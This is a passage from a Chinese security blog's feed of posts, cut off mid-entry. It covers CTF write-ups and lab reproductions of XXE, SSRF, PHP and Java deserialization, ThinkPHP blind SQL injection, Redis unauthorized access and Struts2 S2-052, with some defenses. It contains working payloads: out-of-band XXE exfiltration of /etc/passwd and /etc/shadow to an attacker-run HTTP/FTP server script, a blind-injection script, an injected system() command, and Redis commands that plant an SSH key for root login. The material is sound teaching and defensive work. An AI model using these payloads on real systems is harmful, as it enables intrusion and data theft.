    <url>%2Fctf-2019fireshell%E4%B8%80%E9%81%93%E4%BB%8Exxe%E5%88%B0ssrf%E9%A2%98%2F</url>
    <content type="text"><![CDATA[题目: BadInjection, 其他题解请参考白帽100公众号的FireShell CTF 2019 WriteUp. 0x01任意文件下载file参数存在文件下载，顺藤摸瓜依次下载到index.php，Routers.php，Custom.php，Admin.php。 0x02XXE查看Custom.php： 123456789&lt;?phpclass Custom extends Controller&#123; public static function Test($string)&#123; $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT); $test = $root-&gt;name; echo $test; &#125;&#125;?&gt; 其存在XXE: 0x03代码执行接着再看Admin.php： 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Admin extends Controller&#123; public static function sort($url,$order)&#123; $uri = parse_url($url); $file = file_get_contents($url); $dom = new DOMDocument(); $dom-&gt;loadXML($file,LIBXML_NOENT | LIBXML_DTDLOAD); $xml = simplexml_import_dom($dom); if($xml)&#123; //echo count($xml-&gt;channel-&gt;item); //var_dump($xml-&gt;channel-&gt;item-&gt;link); $data = []; for($i=0;$i&lt;count($xml-&gt;channel-&gt;item);$i++)&#123; //echo $uri['scheme'].$uri['host'].$xml-&gt;channel-&gt;item[$i]-&gt;link."\n"; $data[] = new Url($i,$uri['scheme'].'://'.$uri['host'].$xml-&gt;channel-&gt;item[$i]-&gt;link); //$data[$i] = $uri['scheme'].$uri['host'].$xml-&gt;channel-&gt;item[$i]-&gt;link; &#125; //var_dump($data); usort($data, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');')); echo '&lt;div class="ui list"&gt;'; foreach($data as $dt) &#123; $html = '&lt;div class="item"&gt;'; $html .= ''.$dt-&gt;id.' - '; $html .= ' &lt;a href="'.$dt-&gt;link.'"&gt;'.$dt-&gt;link.'&lt;/a&gt;'; $html .= '&lt;/div&gt;'; &#125; $html .= "&lt;/div&gt;"; echo $html; &#125;else&#123;//... Lz1y师傅提示create_function存在代码执行，前面url给一个rss的订阅源，后面的$order就是注入点： 1http://localhost/admin?rss=http://anemone.top/atom.xml&amp;order=link);&#125;system(&quot;ls /&quot;);// 0x04SSRF从Routers.php可以知道admin.php只能localhost访问： 1234567891011Route::set('admin',function()&#123; if(!isset($_REQUEST['rss']) &amp;&amp; !isset($_REQUES['order']))&#123; Admin::createView('Admin'); &#125;else&#123; if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1')&#123; Admin::sort($_REQUEST['rss'],$_REQUEST['order']); &#125;else&#123; echo ";("; &#125; &#125;&#125;); 只能用xxe打内网了order字段需要url编码: 123456&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM "http://localhost/admin?rss=http://anemone.top/atom.xml&amp;order=%6c%69%6e%6b%29%3b%7d%73%79%73%74%65%6d%28%22%6c%73%22%29%3b%2f%2f" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 列出目录成功： 得到flag：]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web安全</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019安恒01月赛babygo（详解）和其他题目wp]]></title>
    <url>%2Fctf-2019%E5%AE%89%E6%81%9201%E6%9C%88%E8%B5%9Bbabygo%EF%BC%88%E8%AF%A6%E8%A7%A3%EF%BC%89%E5%92%8C%E5%85%B6%E4%BB%96%E9%A2%98%E7%9B%AEwp%2F</url>
    <content type="text"><![CDATA[今天碰上事情，加上自己又菜，只做出两题。 web-babygo题目给出了源代码: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?php@error_reporting(1);include 'flag.php';class baby&#123; protected $skyobj; public $aaa; public $bbb; function __construct() &#123; $this-&gt;skyobj = new sec; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125;&#125;class cool&#123; public $filename; public $nice; //baby object public $amzing; //baby object serialized function read() &#123; $this-&gt;nice = unserialize($this-&gt;amzing); echo $sth; $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) &#123; $file = "./&#123;$this-&gt;filename&#125;"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return "you must be joking!"; &#125; &#125; &#125;&#125;class sec&#123; function read() &#123; return "it's so sec~~"; &#125;&#125;if (isset($_GET['data']))&#123; $Input_data = unserialize($_GET['data']); //baby object echo $Input_data;&#125;else&#123; highlight_file("./index.php");&#125;?&gt; 可以看到存在反序列化漏洞，构造的POP链为: 12baby.__toString() -&gt;cool.read() 注意到baby的$skyobj为protected变量，因此没法先实例化再赋值，只能改__constract()方法，将其设为cool的实例，然后将对象序列化，因为php弱类型，所以反序列化可以成功。通过如下代码生成payload： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php@error_reporting(1);include 'flag.php';class baby&#123; protected $skyobj; public $aaa; public $bbb; function __construct() &#123; $c=new cool(); $c-&gt;filename="flag.php"; $this-&gt;skyobj = $c; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125;&#125;class cool&#123; public $filename; public $nice; //baby object public $amzing; //baby object serialized function read() &#123; $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) &#123; $file = "./&#123;$this-&gt;filename&#125;"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return "you must be joking!"; &#125; &#125; &#125;&#125;// echo $bb_ser;$b=new baby();$b_ser=serialize($b);echo $b_ser;echo "\n";//test:$Input_data = unserialize($b_ser); //baby objectecho $Input_data; 得到payload： 1O:4:"baby":3:&#123;s:9:"%00*%00skyobj";O:4:"cool":3:&#123;s:8:"filename";s:8:"flag.php";s:4:"nice";N;s:6:"amzing";N;&#125;s:3:"aaa";N;s:3:"bbb";N;&#125; 原先我以为cool里面还要再生成一个baby对象绕过if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)，但直接将上面的payload作为get的data发过去就能拿到flag了，原因是$this-&gt;nice = unserialize($this-&gt;amzing);执行后$nice=bool(false)，此时$this-&gt;nice-&gt;aaa=$this-&gt;nice-&gt;bbb=NULL，因为$sth变量没有定义（实际上在flag.php中$sth是定义的，但是在类中不能直接用——需要global声明），因此即使执行$this-&gt;nice-&gt;aaa = $sth;，$this-&gt;nice-&gt;aaa仍为空，因此if判断是通过的。 正确解法如果在类中确实使用了global声明，那么需要用指针使bbb随aaa动态改变（这应该是出题人本来的意思，感谢飘零大佬的wp) 12$b=new baby();$b-&gt;bbb=&amp;$b-&gt;aaa; 现在梳理一下我们的对象关系： 123$baby_outside-&gt;skyobj=$cool_obj $cool_obj-&gt;amzing=serialize($baby_inside) $baby_inside-&gt;bbb=&amp;$baby_inside-&gt;aaa 这样因为最内部的baby-&gt;skyobj不能为cool对象，不然就循环调用了，因此要处理一下构造函数，payload产生代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?php@error_reporting(1);include 'flag.php';class baby&#123; protected $skyobj; public $aaa; public $bbb; function __construct($s) &#123; if($s)&#123; //若为内部则包含sec对象，且使用指针 $this-&gt;bbb=&amp;$this-&gt;aaa; $this-&gt;skyobj=new sec(); &#125; else&#123; //若为外部则构造一个cool对象， $c=new cool(); $c-&gt;filename="flag.php"; $b=new baby('i'); $c-&gt;amzing=serialize($b); $this-&gt;skyobj = $c; &#125; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125;&#125;class cool&#123; public $filename; public $nice; //baby object public $amzing; //baby object serialized function read() &#123; $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) &#123; $file = "./&#123;$this-&gt;filename&#125;"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return "you must be joking!"; &#125; &#125; &#125;&#125;class sec&#123; function read() &#123; return "it's so sec~~"; &#125;&#125;// echo $bb_ser;$b=new baby();$b_ser=serialize($b);echo urlencode($b_ser);echo "\n";$Input_data = unserialize($b_ser); //baby objectecho $Input_data;?&gt; 得到如下payload： 1O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A71%3A%22O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A3%3A%22sec%22%3A0%3A%7B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A3%3B%7D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D 本地复现成功： MISC1使用formost得到一个二维码： 左下角有个很淡的flag，用stegsolve就看的很清楚了： 其他题目记录Reverse1题目给的pyc反编译不了，于是使用pyinstxtractor.py反编译exe，得到一个文件夹，因为文件太多当时就卡住了，实际上应该修复AnhengRe文件的头部，并加上pyc的后缀，就可以反编译出源代码了。 键盘之争将字符串从QWERY键盘的布局对应到Dvorak的布局就可以得到flag，本质上是一个古典密码本。 Web2参考飘零大佬wp,为tp3.2的约束注入，附上exp供以后使用： 查看表、列名payload 1http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and polygon(id)-- 盲注exp： 1234567891011121314import requestsflag = ''cookies = &#123; 'PHPSESSID': 're4g49sil8hfh4ovfrk7ln1o02'&#125;for i in range(1,33): for j in '0123456789abcdef': url = 'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'+str(i)+',1))='+str(ord(j))+'),sleep(3),0)--' try: r = requests.get(url=url,timeout=2.5,cookies=cookies) except: flag += j print flag break]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web安全</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实现包含XXE漏洞的服务、攻击以及防御方法]]></title>
    <url>%2Fxxe-XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E3%80%81%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[实现包含XXE漏洞的服务新建项目不说废话，首先实现一个包含XXE漏洞的服务吧，新建一个SpringBoot项目： 建好之后目录如下 定义Controller新建XXEController.java： 1234567891011121314151617181920212223@RestControllerpublic class XXEController &#123; @PostMapping(value = "/xxe") public String xxe(@RequestBody String userString) throws ParserConfigurationException, IOException, SAXException &#123; DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(new ByteArrayInputStream(userString.getBytes("utf-8"))); String username = getValueByTagName(doc, "username"); String password = getValueByTagName(doc, "password"); return "Username: " + username + "Password: " + password; &#125; private String getValueByTagName(Document doc, String tagName) &#123; if (doc == null || tagName.equals(null)) &#123; return ""; &#125; NodeList pl = doc.getElementsByTagName(tagName); if (pl != null &amp;&amp; pl.getLength() &gt; 0) &#123; return pl.item(0).getTextContent(); &#125; return ""; &#125;&#125; 调试以上一个脆弱的服务器就做好了，用postman发个包，可以看到服务器返回了期待内容： 攻击有回显的XXE攻击新建d:/flag/flag.txt文件，内容为flag:1234 通过外部实体构造Payload: 123456789&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY xxe SYSTEM "file:///d:/flag/flag.txt"&gt;]&gt;&lt;user&gt; &lt;username&gt;&amp;xxe;&lt;/username&gt; &lt;password&gt;passw0rd&lt;/password&gt;&lt;/user&gt; 看到flag.txt内容已经被打印： 无回显的XXE攻击攻击者在自己服务器上构造evil.dtd，并开启http服务（这里假设为127.0.0.1:8000）： 123&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://127.0.0.1:8000/%file;&apos;&gt;&quot;&gt;%payload;%send; 再给靶机发送如下payload: 1234567&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY % file SYSTEM "file:///d:/flag/flag.txt"&gt; &lt;!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/evil.dtd"&gt; %dtd;]&gt;&lt;data&gt;&amp;send;&lt;/data&gt; 发包，看到服务器报错： 同时在攻击机上可以看到文件内容： 使用ftp进行无回显的攻击使用ftp的好处是若服务是java写的可以列目录和获取多行文件（但是我这里在win和linux上都没有复现成功，怀疑是java库的版本问题）。 使用mvn clean package打包出jar 123456789101112131415161718λ mvn clean package[WARNING][WARNING] Some problems were encountered while building the effective settings[WARNING] expected START_TAG or END_TAG not TEXT (position: TEXT seen ...&lt;/repositories&gt;\n\u3000\u3000\u3000 &lt;!-- \u63d2\u4ef6\u4ed3\u5e93 --&gt;\n &lt;p... @232:9) @ D:\Store\document\all_my_work\java_lib\apache-maven-3.5.0\bin\..\conf\settings.xml, line 232, column 9[WARNING][INFO] Scanning for projects...[INFO][INFO] ------------------------------------------------------------------------[INFO] Building xxedemo 0.0.1-SNAPSHOT[INFO] ------------------------------------------------------------------------...[INFO] ------------------------------------------------------------------------[INFO] BUILD SUCCESS[INFO] ------------------------------------------------------------------------[INFO] Total time: 10.617 s[INFO] Finished at: 2019-01-23T14:19:30+08:00[INFO] Final Memory: 37M/324M[INFO] ------------------------------------------------------------------------ 在linux上启动漏洞服务器： 1$ java -jar target/xxedemo-0.0.1-SNAPSHOT.jar 准备脚本xxeftp.py: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#!/usr/bin/env pythonimport SocketServerfrom threading import Threadfrom time import sleepimport loggingfrom sys import argvlogging.basicConfig(filename='server-xxe-ftp.log',level=logging.DEBUG)"""The XML Payload you should send to the server!&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY % file SYSTEM "file:///etc/shadow"&gt; &lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:8888/evil.dtd"&gt; %dtd;]&gt;&lt;data&gt;&amp;send;&lt;/data&gt;"""payload = """&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'ftp://&#123;&#125;:&#123;&#125;/%file;'&gt;"&gt;%all;"""def wlog(_str): print _str logging.info("&#123;&#125;\n".format(_str))class WebServer(SocketServer.BaseRequestHandler): """ Request handler for our webserver. """ def handle(self): """ Blanketly return the XML payload regardless of who's asking. """ resp = """HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nContent-length: &#123;&#125;\r\n\r\n&#123;&#125;\r\n\r\n""".format(len(payload), payload) # self.request is a TCP socket connected to the client self.data = self.request.recv(4096).strip() wlog("[WEB] &#123;&#125; Connected and sent:".format(self.client_address[0])) wlog("&#123;&#125;".format(self.data)) # Send back same data but upper self.request.sendall(resp) wlog("[WEB] Replied with:\n&#123;&#125;".format(resp))class FTPServer(SocketServer.BaseRequestHandler): """ Request handler for our ftp. """ def handle(self): """ FTP Java handler which can handle reading files and directories that are being sent by the server. """ # set timeout self.request.settimeout(10) wlog("[FTP] &#123;&#125; has connected".format(self.client_address[0])) self.request.sendall("220 xxe-ftp-server\n") try: while True: self.data = self.request.recv(4096).strip() wlog("[FTP] Received:\n&#123;&#125;".format(self.data)) if "LIST" in self.data: self.request.sendall("drwxrwxrwx 1 owner group 1 Feb 21 04:37 rsl\n") self.request.sendall("150 Opening BINARY mode data connection for /bin/ls\n") self.request.sendall("226 Transfer complete.\n") elif "USER" in self.data: self.request.sendall("331 password please - version check\n") elif "PORT" in self.data: wlog("[FTP] ! PORT received") wlog("[FTP] &gt; 200 PORT command ok") self.request.sendall("200 PORT command ok\n") elif "SYST" in self.data: self.request.sendall("215 RSL\n") else: wlog("[FTP] &gt; 230 more data please!") self.request.sendall("230 more data please!\n") except Exception, e: if "timed out" in e: wlog("[FTP] Client timed out") else: wlog("[FTP] Client error: &#123;&#125;".format(e)) wlog("[FTP] Connection closed with &#123;&#125;".format(self.client_address[0]))def start_server(conn, serv_class): server = SocketServer.TCPServer(conn, serv_class) t = Thread(target=server.serve_forever) t.daemon = True t.start() if __name__ == "__main__": if not argv[1]: print "[-] Need public IP of this server in order to receive data." exit(1) WEB_ARGS = ("0.0.0.0", 8888) FTP_ARGS = ("0.0.0.0", 2121) payload = payload.format(argv[1],FTP_ARGS[1]) wlog("[WEB] Starting webserver on %s:%d..." % WEB_ARGS) start_server(WEB_ARGS, WebServer) wlog("[FTP] Starting FTP server on %s:%d..." % FTP_ARGS) start_server(FTP_ARGS, FTPServer) try: while True: sleep(10000) except KeyboardInterrupt, e: print "\n[+] Server shutting down." 运行： 123$ python xxeftp.py 127.0.0.1[WEB] Starting webserver on 0.0.0.0:8888...[FTP] Starting FTP server on 0.0.0.0:2121... 发送payload，这次我们查看/etc/passwd： 1234567&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt; &lt;!ENTITY % dtd SYSTEM "http://127.0.0.1:8888/evil.dtd"&gt; %dtd;]&gt;&lt;data&gt;&amp;send;&lt;/data&gt; ftp服务器得到回显，从结果可以看到，有些符号还是中断了ftp的传输： 防御java的很多包都有xxe解析的漏洞，但是防御手段都大同小异，禁用外部实体就完事了： 123DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); 其他包的禁用方法可以参考OWASP(XXE)_Prevention_Cheat_Sheet 可以看到，禁用实体之后已经不存在XXE： 使用Unmarshaller和JAXBContext防御XXE漏洞使用Unmarshaller和JAXBContext防御XXE漏洞是我感觉最优雅的解决办法了，Unmarshaller本身就屏蔽了外部实体，自然也没有XXE漏洞，不仅如此，它还能通过注解与类直接绑定，连解析都省了。 定义DTO新建UserDto.java文件，内容如下： 12345678910111213141516171819202122@XmlAccessorType(XmlAccessType.FIELD)@XmlRootElement(name="user")public class UserDto &#123; @XmlElement private String username; @XmlElement private String password; public String getUsername() &#123; return username; &#125; public String getPassword() &#123; return password; &#125; @Override public String toString() &#123; return "User(username=" + username + ", password=" + password + ")"; &#125;&#125; 定义XML反序列化工具类新建Util.java： 123456789101112131415public class Util &#123; public static Object xmlStr2obj(Class clazz, String xmlStr) &#123; Object xmlObject = null; try &#123; JAXBContext context = JAXBContext.newInstance(clazz); // 进行将Xml转成对象的核心接口 Unmarshaller unmarshaller = context.createUnmarshaller(); StringReader sr = new StringReader(xmlStr); xmlObject = unmarshaller.unmarshal(sr); &#125; catch (JAXBException e) &#123; e.printStackTrace(); &#125; return xmlObject; &#125;&#125; 可以看到我们这里使用了JAXBContext读取XML。 定义Controller新建XXEController.java： 12345678@RestControllerpublic class XXEController &#123; @PostMapping(value = "/xxe2") public String xxe2(@RequestBody String userString)&#123; UserDto userDto=(UserDto) Util.xmlStr2obj(UserDto.class, userString); return "Username: " + userDto.getUsername()+", Password: " + userDto.getPassword(); &#125;&#125; 很有意思的是，笔者在写这文章的一开始就使用了Unmarshaller和JAXBContext的方案，导致了XXE漏洞根本复现不出来&gt;_&lt;]]></content>
      <categories>
        <category>Web安全-XXE</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis未授权&弱密码漏洞复现和防护]]></title>
    <url>%2F%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4%2F</url>
    <content type="text"><![CDATA[漏洞复现0x00 靶机配置 IP：192.168.99.100 使用apt install redis-server安装redis服务 vi /etc/redis/redis.conf，注释掉bind 127.0.0.1 ::1即让redis监听所有网段 新版的redis无密码时会触发保护模式，使用CONFIG SET protected-mode no解除保护模式 以root身份启动redis 1234root@anemone-VirtualBox:/etc# ps -ef|grep redis-serverredis 2847 1 0 21:05 ? 00:00:04 /usr/bin/redis-server *:6379root@anemone-VirtualBox:/etc# kill -9 2847root@anemone-VirtualBox:/etc# redis-server 0x01检测是否存在漏洞在攻击机上探测端口是否开放，redis默认端口为6379：12$ nc -nv 192.168.99.100 6379(UNKNOWN) [192.168.99.100] 6379 (?) open 使用apt install redis安装redis，接着尝试连接：12345678910$ redis-cli -h 192.168.99.100192.168.99.100:6379&gt; info# Serverredis_version:4.0.9redis_git_sha1:00000000redis_git_dirty:0redis_build_id:76095d16786fbcbaredis_mode:standaloneos:Linux 4.15.0-30-generic x86_64arch_bits:64 0x02 写ssh公钥实现远程登陆首先生产密钥对： 1ssh-keygen -t rsa 将公钥制作成上传文件： 1(echo -e "\n\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n\n") &gt; upload.txt 将上传文件保存在redis-cli的临时变量中： 1cat ~/upload.txt | redis-cli -h 192.168.99.100 -x set tmp 连接redis，将tmp变量的内容写入/root/.ssh/authorized_keys:12345redis-cli -h 192.168.99.100config set dir /root/.sshconfig set dbfilename authorized_keysget tmpsave 接着使用私钥即可登陆靶机：1ssh -i ~/.ssh/id_rsa root@192.168.99.100 可以发现登陆成功： 0x03 写crontab文件反弹shellcrontab跟ssh差不多，但是笔者再ubuntu18.04中复现失败，原因是写入的crontab文件存在redis的一些字符，导致格式不正确： 防护 使用apt install redis-server的方式安装，并且使用service redis start启动redis，这样redis会在一个低权限用户下运行： 若必须以root身份运行，为redis设置一定强度的密码（实际复现中我们可以发现，新版redis在以root运行，不设置密码的情况下会启动保护模式，只允许本地cli） 定时检查redis日志： 参考资料 Redis未授权访问详解]]></content>
      <categories>
        <category>Web安全-组件</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化基本原理]]></title>
    <url>%2F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[看完Java的反序列化之后，再看PHP的就很容易，毕竟PHP的反序列化的结果是文本格式。 序列化/反序列化Demophp的序列化/反序列化的函数主要是serialize和unserialize，参考“最通俗易懂的PHP反序列化原理分析”一文，示例代码如下： 1234567891011121314151617181920&lt;?phpclass Person &#123; public $name = "Anemone"; public $sex = "man"; public $age = 18; public function toString()&#123; return $this-&gt;name." ".$this-&gt;sex." ".$this-&gt;age; &#125;&#125;$person = new Person();$person-&gt;age=19;// 序列化$serialized=serialize($person);echo $serialized;echo "\n";// 反序列化$new_person=unserialize($serialized);echo print_r($new_person);echo "\n"; 运行结果： 序列化结构仔细看一下PHP序列化结构，可以看到序列化是只保存对象值而不保存对象代码，所以在java篇时我们需要构造POP链来调用已存在的代码片段，这也是一开始反序列化问题没有被重视的原因。 例题1unserialize1.php: 1234567891011121314151617181920&lt;?php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125; $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; 很明显的一个反序列化造成的文件包含漏洞，我们构造一个Shield对象，将其$file设为要读取的文件，再将其序列化即可，有如下payload： 1234567891011121314151617&lt;?php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125; $x = new Shield(); $x-&gt;file="unserialize1.php"; echo serialize($x);?&gt; 得到O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:16:&quot;unserialize1.php&quot;;}; 传入get参数得到文件： 例题2（+正则绕过 ）unserialize2.php: 123456789101112131415161718192021222324252627282930313233343536&lt;?php@error_reporting(1);class baby&#123; public $file; function __toString() &#123; if(isset($this-&gt;file)) &#123; $filename = "./&#123;$this-&gt;file&#125;"; if (file_get_contents($filename)) &#123; return file_get_contents($filename); &#125; &#125; &#125;&#125;if (isset($_GET['data']))&#123; $data = $_GET['data']; preg_match('/[oc]:\d+:/i',$data,$matches); if(count($matches)) &#123; die('Hacker!'); &#125; else &#123; $good = unserialize($data); echo $good; &#125;&#125;else&#123; echo "hello world";&#125;?&gt; 注意到过滤规则/[oc]:\d+:/i，因为O是对象标记，避免不了，但是后面的数字可以做点文章，比如说O:4:&quot;baby&quot;==O:%2B4:&quot;baby&quot;(%2B是编码后的+号，这里参考了”2018年安恒杯月赛Write Up-12月赛更新“一文，作者在该位置使用fuzz来找到改符号的方法值得我们学习：o:%&lt;FUZZ_POINT&gt;4:&quot;baby&quot;)，按此思路先生成序列化对象： 得到O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:16:&quot;unserialize2.php&quot;;}. 再传入data=O:%2B4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:16:&quot;unserialize2.php&quot;;}得到文件包含： 参考链接 最通俗易懂的PHP反序列化原理分析 2018年安恒杯月赛Write Up-12月赛更新]]></content>
      <categories>
        <category>Web安全-反序列化</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Web安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化3：Struts2-052反序列化漏洞分析]]></title>
    <url>%2F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Struts2-052%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[漏洞复现部署脆弱服务下载struts-2.5.12-all.zip，将 struts-2.5.12/src/apps/ 目录下的 rest-showcase 导入 idea，再配置，如下： 运行后可以看到一个Struts2的一个Demo，大概提供一个订单服务，提供增删改查： 生成攻击载荷使用marshalsec工具，clone项目后使用mvn clean package编译得到target\marshalsec-0.0.3-SNAPSHOT.jar。 生成一个弹出计算器的payload： 1java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO "calc" &gt; poc.xml 弹出计算器选一个先前Burpsuite抓到的Post包，将content-type改为application/xml，body部分改为上面生成的paylod，放之后服务器报错并且弹出计算器： 漏洞分析先看org.apache.struts2.rest.ContentTypeInterceptor.intercept()方法，它是客户端每次发送html请求的入口： 向下调两步，可以看到selector对application/xml选择的handler是XStreamHandler，再看到60行，它调用了XStreamHandler.toObject方法，这里跟进去看一下： 调用XStream.fromXML(): umarshal是一个将已经序列化的xml文本反序列化成Java对象的函数，而先前的marshalsec就是将装配好POP链的类序列化成xml。 参考链接 struts2 s2-052 漏洞分析 marshalsec]]></content>
      <categories>
        <category>Web安全-反序列化</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化2：Commons Collections Java反序列化漏洞与POP Gadgets]]></title>
    <url>%2F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Commons-Collections-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8EPOP-Gadgets%2F</url>
    <content type="text"><![CDATA[利用Commons Collections攻击反序列化漏洞由FoxGlove Security团队首次提出，也是我们第一次看到反序列化类型漏洞的利用，而其整个利用过程后来也被成为面向属性编程（POP），虽然事隔久远，但是还是参考先前大佬们的研究学习一下。 Apache Commons CollectionsApache Commons Collections（以下代码使用commons-collections-3.2.1.jar）拓展了Java原生Collection结构的第三方库，其中有一个TransformedMap类是本文的研究对象。它可以装饰一个基本Map，返回一个TransformedMap，当新元素加入TransformedMap时会对元素进行预先定义的变换（Transformer），比如说有如下代码 12345678Map&lt;String, String&gt; map = new HashMap&lt;&gt;();InvokerTransformer invokerTransformer = new InvokerTransformer( "concat", new Class[]&#123;String.class&#125;, new Object[]&#123;"transformed"&#125; );Map transformMap = TransformedMap.decorate(map, null, invokerTransformer);transformMap.put("key1", "value1");transformMap.forEach((key, value) -&gt; System.out.println(key + ":" + value + "\n")); 执行后结果为： 注意到InvokerTransformer类，它让我们通过反射的方法调用任意对象的任意方法，其构造函数第一个参数是元素的方法（&quot;concat&quot;），第二个参数是方法的参数类型数组（new Class[]{String.class}），第三个参数是具体参数值（new Object[]{&quot;transformed&quot;}），在上面代码的Transfer实际上是调用了value.concat(&quot;transformed&quot;)方法。 